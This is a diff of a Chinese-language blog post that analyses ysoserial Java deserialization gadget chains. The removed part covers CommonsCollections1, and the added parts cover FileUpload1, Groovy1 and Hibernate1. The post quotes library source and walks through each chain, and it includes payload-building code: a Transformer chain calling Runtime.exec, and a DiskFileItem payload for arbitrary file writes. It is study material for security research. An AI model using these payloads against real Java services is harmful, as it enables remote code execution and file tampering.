@@ -459,134 +459,264 @@ TemplatesImpl.TransletClassLoader.defineClass()<span aria-hidden="true" class="l
 <p>最后我们再回来看ysoserial中对这条链的利用代码</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210260214643.png"></p>
 <p>豁然开朗喵喵</p>
-<h2 id="ComminsCollections1（CC1）"><a href="#ComminsCollections1（CC1）" class="headerlink" title="ComminsCollections1（CC1）"></a>ComminsCollections1（CC1）</h2><p>先上链子</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*
-Gadget chain:
-    ObjectInputStream.readObject()
-        AnnotationInvocationHandler.readObject()
-            Map(Proxy).entrySet()
-                AnnotationInvocationHandler.invoke()
-                    LazyMap.get()
-                        ChainedTransformer.transform()
-                            ConstantTransformer.transform()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Class.getMethod()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.getRuntime()
-                            InvokerTransformer.transform()
-                                Method.invoke()
-                                    Runtime.exec()
+<h2 id="FileUpload1"><a href="#FileUpload1" class="headerlink" title="FileUpload1"></a>FileUpload1</h2><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;**
+ * Gadget chain:
+ * DiskFileItem.readObject()
+ *
+ * Arguments:
+ * - copyAndDelete;sourceFile;destDir
+ * - write;destDir;ascii-data
+ * - writeB64;destDir;base64-data
+ * - writeOld;destFile;ascii-data
+ * - writeOldB64;destFile;base64-data
+ *
+ * Yields:
+ * - copy an arbitraty file to an arbitrary directory (source file is deleted if possible)
+ * - pre 1.3.1 (+ old JRE): write data to an arbitrary file
+ * - 1.3.1+: write data to a more or less random file in an arbitrary directory
+ *
+ **&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-Requires:
-    commons-collections
- */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>看介绍直接跟到对应的readObject中看看是怎么进行反序列化的</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void readObject(ObjectInputStream in)
+        throws IOException, ClassNotFoundException &#123;
+    &#x2F;&#x2F; 读取原始数据（属性）
+    in.defaultReadObject();
 
-<p>在来一句大佬的话</p>
-<blockquote>
-<p>CC1 链的关键在三个实现了Transformer接⼝的类 ChainedTransformer ConstantTransformer InvokerTransformer，Transformer 顾名思义就是一个转换器用来处理传入的对象，然后将处理完的对象返回。</p>
-</blockquote>
-<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;Transformer接口
-package org.apache.commons.collections;
+    OutputStream output &#x3D; getOutputStream();
+    if (cachedContent !&#x3D; null) &#123;
+        output.write(cachedContent);
+    &#125; else &#123;
+        FileInputStream input &#x3D; new FileInputStream(dfosFile);
+        IOUtils.copy(input, output);
+        dfosFile.delete();
+        dfosFile &#x3D; null;
+    &#125;
+    output.close();
 
-public interface Transformer &#123;
-    Object transform(Object var1);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    cachedContent &#x3D; null;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>那我们就看看在commons.collection都有哪些类实现了这个接口</p>
-<ol>
-<li><h3 id="InvokerTransformer（调用者转换器）"><a href="#InvokerTransformer（调用者转换器）" class="headerlink" title="InvokerTransformer（调用者转换器）"></a>InvokerTransformer（调用者转换器）</h3><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072202716.png"></p>
-<p>可以看到通过获取<code>this.iMethodName, this.iParamTypes, this.iArgs</code>来反射调用传入类的方法，其中内容都可控，那我们是不是只要传入一个Runtime对象，调用其中的exec方法，就能任意命令执行了呢</p>
-<p>直接调用可行性验证</p>
-<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072215402.png"></p>
-<p>发现成功执行了，但是直接找到⼀个类，它在反序列化的 <code>readObject</code> 里直接或间接调用了 <code>InvokerTransformer</code> 的 <code>transform</code> 方法，并且参数可控，就能RCE，是这样吗？肯定不是，我们都知道待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 <code>java.io.Serializable</code> 接⼝。我们需要传给 <code>transform</code> 方法的参数是 <code>Runtime</code> 对象，在序列化的时候肯定也属于内部属性对象，而它是没有实现 <code>java.io.Serializable</code> 接⼝的，所以即使找到了符合条件的类也没办法构造成序列化数据。</p>
-</li>
-<li><h3 id="ChainedTransformer（链条转换器）"><a href="#ChainedTransformer（链条转换器）" class="headerlink" title="ChainedTransformer（链条转换器）"></a>ChainedTransformer（链条转换器）</h3><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211081031321.png"></p>
-<p>此类的transform通过按顺序调用 <code>Transformer</code> 数组 <code>this.iTransformers</code> 中所有 <code>Transformer</code> 对象的 <code>transform</code> 方法，并且每次调用的结果传递给下一个项目的transform进行调用，就像一个链条一样逐层传递执行，那么二者结合我们就可以利用<code>InvokerTransformer</code>通过反射来间接生成一个<code>Runtime</code>类，进而RCE</p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//反射获取Runtime类</span>
-<span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里通过getOutputStream拿到了一个文件对象，然后如果cachedContent中存在内容就将其写入到这个文件中，跟入<code>getOutputStream</code></p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public OutputStream getOutputStream()
+    throws IOException &#123;
+    if (dfos &#x3D;&#x3D; null) &#123;
+        File outputFile &#x3D; getTempFile();
+        dfos &#x3D; new DeferredFileOutputStream(sizeThreshold, outputFile);
+    &#125;
+    return dfos;
+&#125;
 
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//链式调用写法</span>
-<span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//生成Runtime类对象</span>
-                <span class="token string">"forName"</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">)</span><span class="token punctuation">,</span>
-        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//获取getRuntime方法</span>
-                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">)</span><span class="token punctuation">,</span>
-        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token comment">//获取invoke方法执行</span>
-                <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
-        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//RCE</span>
-                <span class="token string">"exec"</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
-                <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">&#125;</span>
-        <span class="token punctuation">)</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+protected File getTempFile() &#123;
+    if (tempFile &#x3D;&#x3D; null) &#123;
+        File tempDir &#x3D; repository;
+        if (tempDir &#x3D;&#x3D; null) &#123;
+            tempDir &#x3D; new File(System.getProperty(&quot;java.io.tmpdir&quot;));
+        &#125;
 
-<p>最后调用 <code>ChainedTransformer#transform()</code> 即可,参数为 <code>class</code>对象<code>Class.class</code></p>
-<p>最后就是我们怎么获取到一个class对象作为我们链式调用的起点，我们继续往下走</p>
-</li>
-<li><h3 id="ConstantTransformer（常量转换器）"><a href="#ConstantTransformer（常量转换器）" class="headerlink" title="ConstantTransformer（常量转换器）"></a>ConstantTransformer（常量转换器）</h3><p>最后我们再来看<code>ConstantTransformer</code>，这个类实现了序列化接口所以也可以进行反序列化</p>
-<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100043086.png"></p>
-<p>可以看到<code>transform</code>函数就直接返回了<code>this.iConstant</code>，这里的<code>iConstant</code>我们直接传入即可，说白了就是拿一个对象包裹一个对象（听起来多少有点没用），不过，由于其<code>transform</code>方法会将其中的<code>iConstant</code>直接返回，我们就可以在其中包裹一个class类对象来作为上面的链式调用的起点，最终构造的链子如下</p>
-<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100110622.png"></p>
-<p>最终只要调用transform随便扔点啥进去都能调用成功</p>
-</li>
-</ol>
-<p><strong>LazyMap</strong></p>
-<p>下面我们就要进行完整的调用链构造了，RCE的部分我们已经完成了，下一步就是找在<code>readObject</code>方法中调用了可控参数的<code>transform</code>方法的类了，这里ysoserial链子使用的是<code>AnnotationInvocationHandler</code>–&gt;<code>LazyMap#get()</code></p>
-<p>先来看看<code>AnnotationInvocationHandler</code><em><strong>#注释信息处理</strong></em>，其中的<code>readObject</code>方法中并没有直接调用到<code>Map</code> 的<code>get</code>方法，但是在 <code>AnnotationInvocationHandler#invoke()</code> 方法调用了 <code>get</code> 方法，<code>this.memberValues</code>可控并且为<code>Map</code>类，那么我们找个实现了Map接口的类即可，此处利用的是<code>LazyMap</code></p>
-<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110059774.png"></p>
-<p>我们继续跟入，发现<code>LazyMap</code>重写了<code>get</code>方法如下，对<code>factory</code>属性的<code>transform</code>方法进行了调用，此处的factory为Transformer类，使用其的实现类即可（也就是我们用来RCE的ChainedTransformer）</p>
-<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211110105849.png"></p>
-<p>现在的问题就是我们如何调用<code>AnnotationInvocationHandler#invoke()</code>方法了，这里涉及到的知识就是Java的动态代理，我们可以创建一个<code>AnnotationInvocationHandler</code>代理类，然后在调用<code>AnnotationInvocationHandler</code>代理类中的任意方法都会先调用<code>AnnotationInvocationHandler#invoke()</code>方法，是因为我们在调用类内非晶态</p>
-<p>总结一下现有的链子，我们先创建一个<code>LazyMap</code>对象，将其中的<code>factory</code>设置为构造好的<code>ChainedTransformer</code>，这样在调用<code>LazyMap</code>的<code>get</code>方法时就能链式调用导致RCE了，那我们现在再分析一下Poc</p>
-<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class CommonsCollections1 extends PayloadRunner implements ObjectPayload&lt;InvocationHandler&gt; &#123;
+        String tempFileName &#x3D; format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId());
 
-	public InvocationHandler getObject(final String command) throws Exception &#123;
-		final String[] execArgs &#x3D; new String[] &#123; command &#125;;
-		&#x2F;&#x2F;开一个chainedTransformer
-		final Transformer transformerChain &#x3D; new ChainedTransformer(
-			new Transformer[]&#123; new ConstantTransformer(1) &#125;);
-		&#x2F;&#x2F;真正的链子
-		final Transformer[] transformers &#x3D; new Transformer[] &#123;
-				new ConstantTransformer(Runtime.class),
-				new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;
-					String.class, Class[].class &#125;, new Object[] &#123;
-					&quot;getRuntime&quot;, new Class[0] &#125;),
-				new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;
-					Object.class, Object[].class &#125;, new Object[] &#123;
-					null, new Object[0] &#125;),
-				new InvokerTransformer(&quot;exec&quot;,
-					new Class[] &#123; String.class &#125;, execArgs),
-				new ConstantTransformer(1) &#125;;
+        tempFile &#x3D; new File(tempDir, tempFileName);
+    &#125;
+    return tempFile;
+&#125;
+public DeferredFileOutputStream(int threshold, File outputFile) &#123;
+    this(threshold, outputFile, (String)null, (String)null, (File)null, 1024);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-		final Map innerMap &#x3D; new HashMap();
+<p>可以看到首先通过getTempFile生成了临时文件，再生成一个DeferredFileOutputStream类，该类可通过某一阈值（threshold）来判断将文件写入内存中还是硬盘中</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private static DiskFileItem makePayload ( int thresh, String repoPath, String filePath, byte[] data ) throws IOException, Exception &#123;
+    &#x2F;&#x2F; if thresh &lt; written length, delete outputFile after copying to repository temp file
+    &#x2F;&#x2F; otherwise write the contents to repository temp file
+    File repository &#x3D; new File(repoPath);
+    DiskFileItem diskFileItem &#x3D; new DiskFileItem(&quot;test&quot;, &quot;application&#x2F;octet-stream&quot;, false, &quot;test&quot;, 100000, repository);
+    File outputFile &#x3D; new File(filePath);
+    DeferredFileOutputStream dfos &#x3D; new DeferredFileOutputStream(thresh, outputFile);
+    &#x2F;&#x2F; write data to dfos
+    OutputStream os &#x3D; (OutputStream) Reflections.getFieldValue(dfos, &quot;memoryOutputStream&quot;);
+    &#x2F;&#x2F; write data to memoryOutputStream
+    os.write(data);
+    &#x2F;&#x2F; write data to thresholdingOutputStream
 
-		final Map lazyMap &#x3D; LazyMap.decorate(innerMap, transformerChain);
+    Reflections.getField(ThresholdingOutputStream.class, &quot;written&quot;).set(dfos, data.length);
+    Reflections.setFieldValue(diskFileItem, &quot;dfos&quot;, dfos);
+    Reflections.setFieldValue(diskFileItem, &quot;sizeThreshold&quot;, 0);
+    return diskFileItem;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-		final Map mapProxy &#x3D; Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+<p>我们先以文件写入为例子看调用链</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;JDK8
+DiskFileItem.readObject()-&gt;getOutputStream()-&gt;DeferredFileOutputStream(sizeThreshold, getTempFile())#生成可写入的文件对象-&gt;output.write(cachedContent)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-		final InvocationHandler handler &#x3D; Gadgets.createMemoizedInvocationHandler(mapProxy);
+<p>其中的内容来自我们预先定义的cachedContent，sizeThreshold预定义为0</p>
+<p>再来看文件复制的</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;JDK8
+DiskFileItem.readObject()-&gt;getOutputStream()-&gt;DeferredFileOutputStream(sizeThreshold, getTempFile())#生成可写入的文件对象-&gt;output.write(FileInputStream(dfosFile#原始文件))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-		Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); &#x2F;&#x2F; arm with actual transformer chain
+<p>其实和上面的一样啦，就是生成文件对象然后把旧文件内容读出再写入，又因为进行了delete操作所以整个过程类似于剪切</p>
+<p>剩下的因为<del>尊贵的</del>macOS移除了32位支持，所以JDK1.3.1的payload无法测试</p>
+<h2 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h2><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;*
+	Gadget chain:
+AnnotationInvocationHandler#readObject()
+  ConvertedClosure#invoke()
+    ConversionHandler#invoke()
+      ConvertedClosure#invokeCustom()
+        MethodClosure#call()
+          Closure#call()
+            MetaClassImpl#invokeMethod()
+              dgm$748#doMethodInvoke()
+                ProcessGroovyMethods#execute()
+                  Runtime#exec()
 
-		return handler;
-	&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	Requires:
+		groovy
+ *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="ComminsCollections3（CC3）"><a href="#ComminsCollections3（CC3）" class="headerlink" title="ComminsCollections3（CC3）"></a>ComminsCollections3（CC3）</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;*
- * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
- * InvokerTransformer.
- *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>还是和CC一样的AnnotationInvocationHandler起始，其中的memberValues是被代理的Map，依然是通过entrySet触发代理invoke进而逐步触发，前置内容我们略过，直接从ConvertedClosure部分开始看</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;ConversionHandler
+public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;
+    VMPlugin plugin &#x3D; VMPluginFactory.getPlugin();
+    if (plugin.getVersion() &gt;&#x3D; 7 &amp;&amp; this.isDefaultMethod(method)) &#123;
+        Object handle &#x3D; this.handleCache.get(method);
+        if (handle &#x3D;&#x3D; null) &#123;
+            handle &#x3D; plugin.getInvokeSpecialHandle(method, proxy);
+            this.handleCache.put(method, handle);
+        &#125;
+
+        return plugin.invokeHandle(handle, args);
+    &#125; else if (!this.checkMethod(method)) &#123;
+        try &#123;
+            return this.invokeCustom(proxy, method, args);
+        &#125; catch (GroovyRuntimeException var6) &#123;
+            throw ScriptBytecodeAdapter.unwrap(var6);
+        &#125;
+    &#125; else &#123;
+        try &#123;
+            return method.invoke(this, args);
+        &#125; catch (InvocationTargetException var7) &#123;
+            throw var7.getTargetException();
+        &#125;
+    &#125;
+&#125;
+protected boolean checkMethod(Method method) &#123;
+    return isCoreObjectMethod(method);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先是对ConvertedClosure.invoke的调用，看到其中并没有invoke方法就去其继承的父类中找，调用ConversionHandler.invoke，可以看到先通过checkMethod方法对调用的方法进行判断，看是否是Object类型原生存在的方法，很明显entrySet并不是，所以进入到ConvertedClosure.invokeCustom方法</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;ConvertedClosure
+public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable &#123;
+    return this.methodName !&#x3D; null &amp;&amp; !this.methodName.equals(method.getName()) ? null : ((Closure)this.getDelegate()).call(args);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><del>正经人谁写三目表达式啊</del></p>
+<p>总之执行了<code>((Closure)this.getDelegate()).call(args)</code>，delegate的类型是MethodClosure，调用了delegate.call，跟入，发现MethodClosure没有call方法，找父类Closure.call</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;Closure
+public V call(Object... args) &#123;
+    try &#123;
+        return this.getMetaClass().invokeMethod(this, &quot;doCall&quot;, args);
+    &#125; catch (InvokerInvocationException var3) &#123;
+        ExceptionUtils.sneakyThrow(var3.getCause());
+        return null;
+    &#125; catch (Exception var4) &#123;
+        return throwRuntimeException(var4);
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>继续调用MetaClassImpl.invokeMethod(this,”doCall”,args)，代码量过大我们只截取关键部分</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">boolean isClosure &#x3D; object instanceof Closure;
+if (isClosure) &#123;
+    Closure closure &#x3D; (Closure)object;
+    Object owner &#x3D; closure.getOwner();
+    MetaClass ownerMetaClass;
+    if (&quot;call&quot;.equals(methodName) || &quot;doCall&quot;.equals(methodName)) &#123;
+        Class objectClass &#x3D; object.getClass();
+        if (objectClass &#x3D;&#x3D; MethodClosure.class) &#123;
+            MethodClosure mc &#x3D; (MethodClosure)object;
+            methodName &#x3D; mc.getMethod();
+            Class ownerClass &#x3D; owner instanceof Class ? (Class)owner : owner.getClass();
+            MetaClass ownerMetaClass &#x3D; this.registry.getMetaClass(ownerClass);
+            return ownerMetaClass.invokeMethod(ownerClass, owner, methodName, arguments, false, false);
+        &#125;
+
+        if (objectClass &#x3D;&#x3D; CurriedClosure.class) &#123;
+            CurriedClosure cc &#x3D; (CurriedClosure)object;
+            Object[] curriedArguments &#x3D; cc.getUncurriedArguments(arguments);
+            Class ownerClass &#x3D; owner instanceof Class ? (Class)owner : owner.getClass();
+            ownerMetaClass &#x3D; this.registry.getMetaClass(ownerClass);
+            return ownerMetaClass.invokeMethod(owner, methodName, curriedArguments);
+        &#125;
+
+        if (method &#x3D;&#x3D; null) &#123;
+            this.invokeMissingMethod(object, methodName, arguments);
+        &#125;
+    &#125;
+  
+  
+  
+  
+  
+  
+return method !&#x3D; null ? method.doMethodInvoke(object, arguments) : this.invokePropertyOrMissing(object, methodName, originalArguments, fromInsideClass, isCallToSuper);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>此时object类型为MethodClosure，符合判断，因此后面会进入 <code>if(isClosure)</code>条件分支，然后递归调用<code>invokeMethod()</code>方法，我们跟入递归，发现其中执行的是<code>method.doMethodInvoke</code>，其method指向的是<code>dgm$748</code>的实例对象，跟入查看其实现</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;dgm$748
+&#x2F;&#x2F;var1&#x3D;command
+public final Object doMethodInvoke(Object var1, Object[] var2) &#123;
+    this.coerceArgumentsToClasses(var2);
+    return ProcessGroovyMethods.execute((String)var1);
+&#125;
+其中ProcessGroovyMethods.execute的实现为
+public static Process execute(String self) throws IOException &#123;
+    return Runtime.getRuntime().exec(self);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>命令执行成功</p>
+<h2 id="Hibernate1"><a href="#Hibernate1" class="headerlink" title="Hibernate1"></a>Hibernate1</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;**
+ *
+ * org.hibernate.property.access.spi.GetterMethodImpl.get()
+ * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
+ * org.hibernate.type.ComponentType.getPropertyValue(C)
+ * org.hibernate.type.ComponentType.getHashCode()
+ * org.hibernate.engine.spi.TypedValue$1.initialize()
+ * org.hibernate.engine.spi.TypedValue$1.initialize()
+ * org.hibernate.internal.util.ValueHolder.getValue()
+ * org.hibernate.engine.spi.TypedValue.hashCode()
+ *
+ *
+ * Requires:
+ * - Hibernate (&gt;&#x3D; 5 gives arbitrary method invocation, &lt;5 getXYZ only)
+ *
+ * @author mbechler
+ *&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
